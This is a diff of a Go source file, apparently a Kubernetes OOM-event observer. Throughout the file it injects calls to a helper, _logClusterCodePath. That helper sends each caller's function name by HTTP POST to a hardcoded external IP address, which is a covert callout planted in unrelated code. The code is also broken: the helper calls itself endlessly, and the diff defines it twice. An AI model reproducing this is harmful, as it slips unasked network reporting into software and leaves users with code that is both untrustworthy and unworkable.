@@ -22,9 +22,13 @@ type Observer struct{ ObservedOomsChannel chan OomInfo }
 func NewObserver() Observer {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return Observer{ObservedOomsChannel: make(chan OomInfo, 5000)}
 }
 func parseEvictionEvent(event *apiv1.Event) []OomInfo {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if event.Reason != "Evicted" || event.InvolvedObject.Kind != "Pod" {
@@ -61,12 +65,16 @@ func parseEvictionEvent(event *apiv1.Event) []OomInfo {
 func (o *Observer) OnEvent(event *apiv1.Event) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	glog.V(1).Infof("OOM Observer processing event: %+v", event)
 	for _, oomInfo := range parseEvictionEvent(event) {
 		o.ObservedOomsChannel <- oomInfo
 	}
 }
 func findStatus(name string, containerStatuses []apiv1.ContainerStatus) *apiv1.ContainerStatus {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for _, containerStatus := range containerStatuses {
@@ -79,6 +87,8 @@ func findStatus(name string, containerStatuses []apiv1.ContainerStatus) *apiv1.C
 func findSpec(name string, containers []apiv1.Container) *apiv1.Container {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, containerSpec := range containers {
 		if containerSpec.Name == name {
 			return &containerSpec
@@ -89,8 +99,12 @@ func findSpec(name string, containers []apiv1.Container) *apiv1.Container {
 func (*Observer) OnAdd(obj interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (o *Observer) OnUpdate(oldObj, newObj interface{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	oldPod, ok := oldObj.(*apiv1.Pod)
@@ -117,11 +131,22 @@ func (o *Observer) OnUpdate(oldObj, newObj interface{}) {
 func (*Observer) OnDelete(obj interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
